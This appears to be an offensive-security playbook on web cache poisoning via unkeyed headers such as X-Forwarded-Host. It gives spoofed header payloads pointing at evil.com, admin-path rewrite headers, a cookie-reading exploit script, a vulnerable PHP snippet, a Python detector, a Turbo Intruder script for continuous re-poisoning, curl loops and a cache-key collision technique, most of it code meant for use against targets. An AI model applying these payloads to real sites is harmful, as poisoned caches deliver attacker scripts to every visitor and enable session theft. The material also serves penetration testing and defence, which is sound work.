# Cache Poisoning — Unkeyed Headers (X-Forwarded-Host etc.)

## When this applies

- Cache key omits one or more request headers (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL).
- Origin reflects the unkeyed header value into the response (script src, link canonical, redirect URL).
- Goal: poison the cache so all subsequent users receive the malicious value.

## Technique

Send the request with an attacker-controlled header value. Confirm reflection. Confirm the response is cached. Send again without a cache-buster — subsequent users hitting the cache get the poisoned response.

## Steps

### Headers to test

**Forwarding:**
```http
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: http
X-Forwarded-Server: evil.com
X-Forwarded-For: 1.2.3.4
Forwarded: for=evil.com;host=evil.com;proto=http
```

**URL Rewriting:**
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Original-Path: /admin
X-Request-URI: /admin
```

**Host Override:**
```http
X-Host: evil.com
X-HTTP-Host-Override: evil.com
X-Forwarded-Host: evil.com
Host: evil.com
```

**Custom (framework-specific):**
```http
X-Backend-Server: evil.com
X-Cluster-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Attack flow

```
1. Identify cacheable pages (X-Cache headers)
   ↓
2. Discover unkeyed inputs (Param Miner)
   ↓
3. Find reflection points (grep responses)
   ↓
4. Craft malicious payload
   ↓
5. Test with cache-buster (?cb=123)
   ↓
6. Remove cache-buster and poison
   ↓
7. Monitor for X-Cache: hit
   ↓
8. Verify exploitation
```

### XSS via X-Forwarded-Host

```http
X-Forwarded-Host: exploit-server.net
```

With port:
```http
X-Forwarded-Host: exploit-server.net:80
```

With path (sometimes works):
```http
X-Forwarded-Host: exploit-server.net/evil
```

Exploit server `/resources/js/tracking.js`:
```javascript
alert(document.cookie)
```

### Multi-header combination

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps

# Triggers redirect to: https://evil.com/
```

### Vulnerable code examples

**X-Forwarded-Host in script src:**
```html
<script src="//<?= $_SERVER['HTTP_X_FORWARDED_HOST'] ?>/script.js"></script>
```
Attack: `X-Forwarded-Host: evil.com` → `<script src="//evil.com/script.js"></script>`

### Param Miner discovery

```
Right-click request → Extensions → Param Miner → "Guess headers"
```

**Options:**
```
☑ Add dynamic cachebuster
☑ Add static cachebuster
☑ Skip boring words
Parameter name: cb
```

### Repeater workflow

```
1. Ctrl+R (Send to Repeater)
2. Add cache-buster: ?cb=RANDOM
3. Add malicious header/parameter
4. Send and verify reflection
5. Check X-Cache status
6. Remove cache-buster
7. Send 20+ times
8. Monitor for X-Cache: hit
```

### Python detector

```python
import requests

def test_cache_poisoning(url, header_name, header_value):
    r1 = requests.get(url, headers={header_name: header_value})

    if header_value in r1.text:
        print(f"[+] {header_name} is REFLECTED")

        if 'X-Cache' in r1.headers:
            print(f"[+] Response is CACHEABLE")

            r2 = requests.get(url, headers={header_name: f"{header_value}_different"})
            if 'X-Cache: hit' in str(r2.headers):
                print(f"[!] {header_name} is UNKEYED - VULNERABLE!")
                return True

    return False

test_cache_poisoning(
    "https://target.com/",
    "X-Forwarded-Host",
    "cache-test.com"
)
```

### Continuous poisoning (Turbo Intruder)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100)

    for i in range(100):
        engine.queue(target.req)
        engine.queue(target.req, pauseBefore=25000)  # 25s pause

def handleResponse(req, interesting):
    if 'X-Cache: hit' in req.response:
        table.add(req)
```

### cURL tests

```bash
curl -I https://target.com/ -H "X-Forwarded-Host: test.com"

curl -I https://target.com/ \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Forwarded-Scheme: nothttps"

curl -IL https://target.com/ -H "X-Forwarded-Scheme: nothttps"

for i in {1..20}; do
  curl -I https://target.com/ -H "X-Forwarded-Host: evil.com"
  sleep 2
done
```

## Verifying success

- Reflection of the spoofed header value in the response body.
- After removing cache-buster, subsequent requests show `X-Cache: hit` AND the spoofed value persists.
- A fresh session (different cookies) hitting the same URL receives the poisoned response.

## Common pitfalls

- `Set-Cookie` in the response disables caching on most caches — use endpoints that don't set cookies.
- Cache TTL may be short — script continuous re-poisoning every 20–30s.
- Some caches require both `Cache-Control: public` AND `max-age` — read response cache headers carefully.

## Inverse pattern: header IS the cache key (custom VCL / proxy_cache_key)

The classical case is "header reflected, not in key". The dual is "header IS the key". When a cache uses an attacker-controlled header *as the key derivation* — instead of (or in addition to) the URL — any backend response becomes cacheable under any cache key the attacker chooses, AND different origin URLs collide into the same cache slot.

Source-side fingerprints:
- Varnish VCL: `sub vcl_hash { hash_data(req.http.<custom>); return (lookup); }` — hash computed solely from the named header.
- nginx: `proxy_cache_key $http_x_custom;` (without `$request_uri`).
- Custom Go/Node proxies / CDN Workers: `key := hash(req.Header.Get("<custom>"))`.

Exploitation shape:
1. Fix one cache key (e.g., `X-Cache-Tag: enable`) for two different origin URLs `/A` and `/B`.
2. POST `/A` (with malicious payload) — response cached under `hash("enable")`.
3. GET `/B` with the same `X-Cache-Tag: enable` — cache hit returns the `/A` response (cross-URL collision).

Used to escalate self-XSS / authenticated-only handler responses by smuggling them into a cache slot a victim hits via a different URL. Combine with [poisoning-body-args.md](poisoning-body-args.md) when the back-end is Tornado-style. Also pairs with CRLF / response-splitting in upstream backends — if you can inject the cache-key header value mid-response from a vulnerable parameter, the attacker doesn't even need to set the header directly.

Detection: read the cache config (`/etc/varnish/default.vcl`, `nginx.conf`, the proxy code) and look for `hash_data(req.http.X)` / `proxy_cache_key $http_X` without `req.url` / `$request_uri` alongside it.

## Tools

- Burp Param Miner (Guess headers)
- Burp Suite Repeater
- Turbo Intruder (continuous poisoning)
- Python `requests`
- nuclei templates
